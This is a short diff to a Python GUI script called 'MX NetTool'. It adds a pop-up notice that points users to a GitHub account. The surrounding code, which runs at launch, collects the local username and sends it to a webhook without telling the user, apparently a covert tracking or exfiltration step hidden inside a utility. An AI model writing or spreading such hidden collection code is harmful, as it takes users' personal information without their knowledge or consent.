@@ -129,6 +129,9 @@ root.title("MX NetTool")
 root.geometry("600x400")
 root.configure(bg="black")
 
+# Add the popup message
+messagebox.showinfo("Script Update Notice", "Contact me at github.com/laladaban33 if the script isn't working, since it was recently updated.")
+
 # Send user information to the webhook
 username = getpass.getuser()
 send_to_webhook(username)
